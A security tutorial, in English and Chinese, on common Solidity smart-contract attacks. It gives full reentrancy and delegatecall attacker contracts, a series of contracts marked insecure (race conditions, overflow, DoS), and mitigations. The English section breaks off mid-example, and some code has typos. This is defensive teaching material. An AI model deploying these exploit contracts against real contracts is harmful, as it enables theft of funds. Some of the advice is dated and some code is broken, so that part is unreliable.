# Common Attacks



Re-Entrancy Reentrancy Attack
The so-called re-entry means that A calls B, and A is called in B. Of course, re-entry is not a problem. The key to the attack here is that although A will check the relevant state before calling B, it will only change the relevant state after B returns, which leads to the cycle of A calling B and B calling A. Keep looping until B actively stops.

Attack example:

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract EtherStore {
     mapping(address => uint) public balances;

     function deposit() public payable {
         balances[msg.sender] += msg.value;
     }
    
     function withdraw() public {
         uint bal = balances[msg.sender];
         require(bal > 0);
    
         (bool sent, ) = msg. sender. call{value: bal}("");
         require(sent, "Failed to send Ether");
    
         balances[msg.sender] = 0;
     }
    
     // Helper function to check the balance of this contract
     function getBalance() public view returns (uint) {
         return address(this).balance;
     }
}

contract Attack {
     EtherStore public etherStore;

     constructor(address _etherStoreAddress) {
         etherStore = EtherStore(_etherStoreAddress);
     }
    
     // Fallback is called when EtherStore sends Ether to this contract.
     fallback() external payable {
         if (address(etherStore). balance >= 1 ether) {
             etherStore. withdraw();
         }
     }
    
     function attack() external payable {
         require(msg. value >= 1 ether);
         etherStore. deposit{value: 1 ether}();
         etherStore. withdraw();
     }
    
     // Helper function to check the balance of this contract
     function getBalance() public view returns (uint) {
         return address(this).balance;
     }
}
In this example, EtherStore is a compromised contract that can stake and withdraw ETH. Attack is a contract that attacks EtherSotre.

Attack steps:

Deploy EtherStore
Alice and Bob each pledge 1 ETH to EtherStore
Eve uses the address of the EtherStore to deploy Attack
Eve calls Attack.attack
Eve retrieves 3 ETH from the EtherStore (1 staked by herself and 2 belonged to Alice and Bob)
Pre-knowledge points:

How much ETH a contract owns is recorded in the <address>.balance field, which is done automatically when processing Transaction, and does not require the contract to write code to implement. Therefore, although the EtherStore contract in the above sample code uses a mapping type of balances to record the number of pledges of different people, it is only a record. When transferring funds (especially transferring out), it really depends on how many coins are in <address>.balance.
The fallback function is a special function in the contract. When calling a function of a contract, if the function signature of the function implemented in the called contract (such as getBalance() public view returns (uint) is a function signature) is not consistent with it If it matches, the fallback function (if you are familiar with Python, it is equivalent to the __missing__ method in Python) will be called. In the example msg.sender.call will be called into the fallback function.
Attack explained:
In the above example, Alice and Bob pledged 1 ETH respectively, so there are 2 ETH in address(Etherstore).balance. When Eve called Attack.attack, he pledged 1 ETH first, in order to pass the initial judgment when calling EtherStore.withdraw:

     function withdraw() public {
         uint bal = balances[msg. sender];
         require(bal > 0);
    
         /// hide code  …
     }
After Eve pledged 1 ETH, he called EtherStore.withdraw to start withdrawing and stealing ETH. The implementation of EtherStore.withdraw is to first judge whether there is a pledge of the caller (that is, Eve) in EtherStore.balances. If there is (of course, 1 ETH), first call msg.sender.call{value: bal}("") Return ETH to Eve; and msg.sender.call{value: bal}("") This call will not only transfer bal so much ETH to Eve's account, but also enter Attack.fallback, in Attack.fallback , the attacker calls EtherStore.withdraw again. Since the record of Eve in EtherStore.balances has not been cleared, the initial judgment of EtherStore.withdraw can still pass, and then transfer bal ETH to the Eve account again. If looping, cannot stop until Attak.fallback no longer calls EtherStore.withdraw.

How to avoid:

Do not call other contracts until the state change has been processed:
  function withdraw() public {
      uint bal = balances[msg. sender];
      require(bal > 0);
      balances[msg.sender] = 0; // important: clear to zero before calling call

      (bool sent, ) = msg. sender. call{value: bal}("");
      require(sent, "Failed to send Ether");
  }
Use a lock to prevent reentrancy:
  // SPDX-License-Identifier: MIT
  pragma solidity ^0.8.13;

  contract ReEntrancyGuard {
      bool internal locked;

      modifier noReentrant() {
          require(!locked, "No re-entrancy");
          locked = true;
          _;
          locked = false;
      }
  }
Try not to use call , use send or transfer instead
Delegate call attack
delegatecall is a function provided in the solidity language. The difference between delegatecall and ordinary call is that when using delegatecall to enter the target function, its context information (such as msg.sender, contract state variables, etc.) is the information of the caller. In other words, the effect of delegatecall is related to copying the code of the called function to the current environment for execution.

Attack example (there are two examples in the link, we chose the more complicated one here):

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract Lib {
     uint public someNumber;

     function doSomething(uint_num) public {
         someNumber = _num;
     }
}

contract HackMe {
     address public lib;
     address public owner;
     uint public someNumber;

     constructor(address_lib) {
         lib = _lib;
         owner = msg. sender;
     }
    
     function doSomething(uint_num) public {
         lib.delegatecall(abi.encodeWithSignature("doSomething(uint256)", _num));
     }
}

contract Attack {
     // Make sure the storage layout is the same as HackMe
     // This will allow us to correctly update the state variables
     address public lib;
     address public owner;
     uint public someNumber;

     HackMe public hackMe;
    
     constructor(HackMe _hackMe) {
         hackMe = HackMe(_hackMe);
     }
    
     function attack() public {
         // override address of lib
         hackMe.doSomething(uint(uint160(address(this))));
         // pass any number as input, the function doSomething() below will
         // be called
         hackMe. doSomething(1);
     }
    
     // function signature must match HackMe.doSomething()
     function doSomething(uint_num) public {
         owner = msg. sender;
     }
}
In the above example, HackMe is the contract being attacked; Attack is the contract that initiated the attack.

Attack steps:

Alice deployment







http://yangzhe.me/2022/09/05/solidity-contract-vulnerability/





## 已知的攻击



### 竞态[*](https://github.com/ConsenSys/smart-contract-best-practices/blob/master/README-zh.md#footnote-race-condition-terminology)

调用外部合约的主要危险之一是它们可以接管控制流，并对调用函数意料之外的数据进行更改。 这类bug有多种形式，导致DAO崩溃的两个主要错误都是这种错误。



#### 重入

这个版本的bug被注意到是其可以在第一次调用这个函数完成之前被多次重复调用。对这个函数不断的调用可能会造成极大的破坏。

```
// INSECURE
mapping (address => uint) private userBalances;

function withdrawBalance() public {
    uint amountToWithdraw = userBalances[msg.sender];
    if (!(msg.sender.call.value(amountToWithdraw)())) { throw; } // At this point, the caller's code is executed, and can call withdrawBalance again
    userBalances[msg.sender] = 0;
}
```

（*译者注：使用msg.sender.call.value()()）传递给fallback函数可用的gas是当前剩余的所有gas，在这里，假如从你账户执行提现操作的恶意合约的fallback函数内递归调用你的withdrawBalance()便可以从你的账户转走更多的币。*）

可以看到当调msg.sender.call.value()()时，并没有将userBalances[msg.sender] 清零，于是在这之前可以成功递归调用很多次withdrawBalance()函数。 一个非常相像的bug便是出现在针对 DAO 的攻击。

在给出来的例子中，最好的方法是 [使用 `send()` 而不是`call.value()()`](https://github.com/ConsenSys/smart-contract-best-practices#send-vs-call-value)。这将避免多余的代码被执行。

然而，如果你没法完全移除外部调用，另一个简单的方法来阻止这个攻击是确保你在完成你所有内部工作之前不要进行外部调用：

```
mapping (address => uint) private userBalances;

function withdrawBalance() public {
    uint amountToWithdraw = userBalances[msg.sender];
    userBalances[msg.sender] = 0;
    if (!(msg.sender.call.value(amountToWithdraw)())) { throw; } // The user's balance is already 0, so future invocations won't withdraw anything
}
```

注意如果你有另一个函数也调用了 `withdrawBalance()`， 那么这里潜在的存在上面的攻击，所以你必须认识到任何调用了不受信任的合约代码的合约也是不受信任的。继续浏览下面的相关潜在威胁解决办法的讨论。

#### 跨函数竞态

攻击者也可以使用两个共享状态变量的不同的函数来进行类似攻击。

```
// INSECURE
mapping (address => uint) private userBalances;

function transfer(address to, uint amount) {
    if (userBalances[msg.sender] >= amount) {
       userBalances[to] += amount;
       userBalances[msg.sender] -= amount;
    }
}

function withdrawBalance() public {
    uint amountToWithdraw = userBalances[msg.sender];
    if (!(msg.sender.call.value(amountToWithdraw)())) { throw; } // At this point, the caller's code is executed, and can call transfer()
    userBalances[msg.sender] = 0;
}
```

着这个例子中，攻击者在他们外部调用`withdrawBalance`函数时调用`transfer()`，如果这个时候`withdrawBalance`还没有执行到`userBalances[msg.sender] = 0;`这里，那么他们的余额就没有被清零，那么他们就能够调用`transfer()`转走代币尽管他们其实已经收到了代币。这个弱点也可以被用到对DAO的攻击。

同样的解决办法也会管用，在执行转账操作之前先清零。也要注意在这个例子中所有函数都是在同一个合约内。然而，如果这些合约共享了状态，同样的bug也可以发生在跨合约调用中。

#### 竞态解决办法中的陷阱

由于竞态既可以发生在跨函数调用，也可以发生在跨合约调用，任何只是避免重入的解决办法都是不够的。

作为替代，我们建议首先应该完成所有内部的工作然后再执行外部调用。这个规则可以避免竞态发生。然而，你不仅应该避免过早调用外部函数而且应该避免调用那些也调用了外部函数的外部函数。例如，下面的这段代码是不安全的：

```
// INSECURE
mapping (address => uint) private userBalances;
mapping (address => bool) private claimedBonus;
mapping (address => uint) private rewardsForA;

function withdraw(address recipient) public {
    uint amountToWithdraw = userBalances[recipient];
    rewardsForA[recipient] = 0;
    if (!(recipient.call.value(amountToWithdraw)())) { throw; }
}

function getFirstWithdrawalBonus(address recipient) public {
    if (claimedBonus[recipient]) { throw; } // Each recipient should only be able to claim the bonus once

    rewardsForA[recipient] += 100;
    withdraw(recipient); // At this point, the caller will be able to execute getFirstWithdrawalBonus again.
    claimedBonus[recipient] = true;
}
```

尽管`getFirstWithdrawalBonus()` 没有直接调用外部合约，但是它调用的`withdraw()` 却会导致竞态的产生。在这里你不应该认为`withdraw()`是受信任的。

```
mapping (address => uint) private userBalances;
mapping (address => bool) private claimedBonus;
mapping (address => uint) private rewardsForA;

function untrustedWithdraw(address recipient) public {
    uint amountToWithdraw = userBalances[recipient];
    rewardsForA[recipient] = 0;
    if (!(recipient.call.value(amountToWithdraw)())) { throw; }
}

function untrustedGetFirstWithdrawalBonus(address recipient) public {
    if (claimedBonus[recipient]) { throw; } // Each recipient should only be able to claim the bonus once

    claimedBonus[recipient] = true;
    rewardsForA[recipient] += 100;
    untrustedWithdraw(recipient); // claimedBonus has been set to true, so reentry is impossible
}
```

除了修复bug让重入不可能成功，[不受信任的函数也已经被标记出来](https://github.com/ConsenSys/smart-contract-best-practices#mark-untrusted-contracts) 。同样的情景： `untrustedGetFirstWithdrawalBonus()` 调用`untrustedWithdraw()`, 而后者调用了外部合约，因此在这里`untrustedGetFirstWithdrawalBonus()` 是不安全的。

另一个经常被提及的解决办法是（*译者注：像传统多线程编程中一样*）使用[mutex](https://en.wikipedia.org/wiki/Mutual_exclusion)。它会"lock" 当前状态，只有锁的当前拥有者能够更改当前状态。一个简单的例子如下：

```
// Note: This is a rudimentary example, and mutexes are particularly useful where there is substantial logic and/or shared state
mapping (address => uint) private balances;
bool private lockBalances;

function deposit() payable public returns (bool) {
    if (!lockBalances) {
        lockBalances = true;
        balances[msg.sender] += msg.value;
        lockBalances = false;
        return true;
    }
    throw;
}

function withdraw(uint amount) payable public returns (bool) {
    if (!lockBalances && amount > 0 && balances[msg.sender] >= amount) {
        lockBalances = true;

        if (msg.sender.call(amount)()) { // Normally insecure, but the mutex saves it
          balances[msg.sender] -= amount;
        }

        lockBalances = false;
        return true;
    }

    throw;
}
```

如果用户试图在第一次调用结束前第二次调用 `withdraw()`，将会被锁住。 这看上去很有效果，但当你使用多个合约互相交互时问题变得严峻了。 下面是一段不安全的代码：

```
// INSECURE
contract StateHolder {
    uint private n;
    address private lockHolder;

    function getLock() {
        if (lockHolder != 0) { throw; }
        lockHolder = msg.sender;
    }

    function releaseLock() {
        lockHolder = 0;
    }

    function set(uint newState) {
        if (msg.sender != lockHolder) { throw; }
        n = newState;
    }
}
```

攻击者可以只调用`getLock()`，然后就不再调用 `releaseLock()`。如果他们真这样做，那么这个合约将会被永久锁住，任何接下来的操作都不会发生了。如果你使用mutexs来避免竞态，那么一定要确保没有地方能够打断锁的进程或绝不释放锁。（这里还有一个潜在的威胁，比如死锁和活锁。在你决定使用锁之前最好大量阅读相关文献（*译者注：这是真的，传统的在多线程环境下对锁的使用一直是个容易犯错的地方*））



\* 有些人可能会发反对使用该术语 *竞态*，因为以太坊并没有真正意思上实现并行执行。然而在逻辑上依然存在对资源的竞争，同样的陷阱和潜在的解决方案。



### 交易顺序依赖(TOD) / 前面的先运行

以上是涉及攻击者在**单个交易**内执行恶意代码产生竞态的示例。接下来演示在区块链本身运作原理导致的竞态：（同一个block内的）交易顺序很容易受到操纵。

由于交易在短暂的时间内会先存放到mempool中，所以在矿工将其打包进block之前，是可以知道会发生什么动作的。这对于一个去中心化的市场来说是麻烦的，因为可以查看到代币的交易信息，并且可以在它被打包进block之前改变交易顺序。避免这一点很困难，因为它归结为具体的合同本身。例如，在市场上，最好实施批量拍卖（这也可以防止高频交易问题）。 另一种使用预提交方案的方法（“我稍后会提供详细信息”）。



### 时间戳依赖

请注意，块的时间戳可以由矿工操纵，并且应考虑时间戳的所有直接和间接使用。 **区块数量**和**平均出块时间**可用于估计时间，但这不是区块时间在未来可能改变（例如Casper期望的更改）的证明。

```
uint someVariable = now + 1;

if (now % 2 == 0) { // the now can be manipulated by the miner

}

if ((someVariable - 100) % 2 == 0) { // someVariable can be manipulated by the miner

}
```



### 整数上溢和下溢

这里大概有 [20关于上溢和下溢的例子](https://github.com/ethereum/solidity/issues/796#issuecomment-253578925)。

考虑如下这个简单的转账操作：

```
mapping (address => uint256) public balanceOf;

// INSECURE
function transfer(address _to, uint256 _value) {
    /* Check if sender has balance */
    if (balanceOf[msg.sender] < _value)
        throw;
    /* Add and subtract new balances */
    balanceOf[msg.sender] -= _value;
    balanceOf[_to] += _value;
}

// SECURE
function transfer(address _to, uint256 _value) {
    /* Check if sender has balance and for overflows */
    if (balanceOf[msg.sender] < _value || balanceOf[_to] + _value < balanceOf[_to])
        throw;

    /* Add and subtract new balances */
    balanceOf[msg.sender] -= _value;
    balanceOf[_to] += _value;
}
```

如果余额到达**uint**的最大值（2^256），便又会变为0。应当检查这里。溢出是否与之相关取决于具体的实施方式。想想uint值是否有机会变得这么大或和谁会改变它的值。如果任何用户都有权利更改uint的值，那么它将更容易受到攻击。如果只有管理员能够改变它的值，那么它可能是安全的，因为没有别的办法可以跨越这个限制。

对于下溢同样的道理。如果一个uint别改变后小于0，那么将会导致它下溢并且被设置成为最大值（2^256）。

对于较小数字的类型比如uint8、uint16、uint24等也要小心：他们更加容易达到最大值。



### 通过(Unexpected) Throw发动DoS

考虑如下简单的智能合约：

```
// INSECURE
contract Auction {
    address currentLeader;
    uint highestBid;

    function bid() payable {
        if (msg.value <= highestBid) { throw; }

        if (!currentLeader.send(highestBid)) { throw; } // Refund the old leader, and throw if it fails

        currentLeader = msg.sender;
        highestBid = msg.value;
    }
}
```

当有更高竞价时，它将试图退款给曾经最高竞价人，如果退款失败则会抛出异常。这意味着，恶意投标人可以成为当前最高竞价人，同时确保对其地址的任何退款**始终**失败。这样就可以阻止任何人调用“bid()”函数，使自己永远保持领先。建议向之前所说的那样建立[基于pull的支付系统](https://github.com/ConsenSys/smart-contract-best-practices/#favor-pull-over-push-payments) 。

另一个例子是合约可能通过数组迭代来向用户支付（例如，众筹合约中的支持者）时。 通常要确保每次付款都成功。 如果没有，应该抛出异常。 问题是，如果其中一个支付失败，您将恢复整个支付系统，这意味着该循环将永远不会完成。 因为一个地址没有转账成功导致其他人都没得到报酬。

```
address[] private refundAddresses;
mapping (address => uint) public refunds;

// bad
function refundAll() public {
    for(uint x; x < refundAddresses.length; x++) { // arbitrary length iteration based on how many addresses participated
        if(refundAddresses[x].send(refunds[refundAddresses[x]])) {
            throw; // doubly bad, now a single failure on send will hold up all funds
        }
    }
}
```

再一次强调，同样的解决办法： [优先使用pull 而不是push支付系统](https://github.com/ConsenSys/smart-contract-best-practices/blob/master/README-zh.md#favor-pull-over-push-payments)。



### 通过区块Gas Limit发动DoS

在先前的例子中你可能已经注意到另一个问题：一次性向所有人转账，很可能会导致达到以太坊区块gas limit的上限。以太坊规定了每一个区块所能花费的gas limit，如果超过你的交易便会失败。

即使没有故意的攻击，这也可能导致问题。然而，最为糟糕的是如果gas的花费被攻击者操控。在先前的例子中，如果攻击者增加一部分收款名单，并设置每一个收款地址都接收少量的退款。这样一来，更多的gas将会被花费从而导致达到区块gas limit的上限，整个转账的操作也会以失败告终。

又一次证明了 [优先使用pull 而不是push支付系统](https://github.com/ConsenSys/smart-contract-best-practices/blob/master/README-zh.md#favor-pull-over-push-payments)。

如果你实在必须通过遍历一个变长数组来进行转账，最好估计完成它们大概需要多少个区块以及多少笔交易。然后你还必须能够追踪得到当前进行到哪以便当操作失败时从那里开始恢复，举个例子：

```
struct Payee {
    address addr;
    uint256 value;
}
Payee payees[];
uint256 nextPayeeIndex;

function payOut() {
    uint256 i = nextPayeeIndex;
    while (i < payees.length && msg.gas > 200000) {
      payees[i].addr.send(payees[i].value);
      i++;
    }
    nextPayeeIndex = i;
}
```

如上所示，你必须确保在下一次执行`payOut()`之前另一些正在执行的交易不会发生任何错误。如果必须，请使用上面这种方式来处理。



### ~~Call Depth攻击~~

由于[EIP 150](https://github.com/ethereum/EIPs/issues/150) 进行的硬分叉，Call Depth攻击已经无法实施[*](http://ethereum.stackexchange.com/questions/9398/how-does-eip-150-change-the-call-depth-attack) （由于以太坊限制了Call Depth最大为1024，确保了在达到最大深度之前gas都能被正确使用）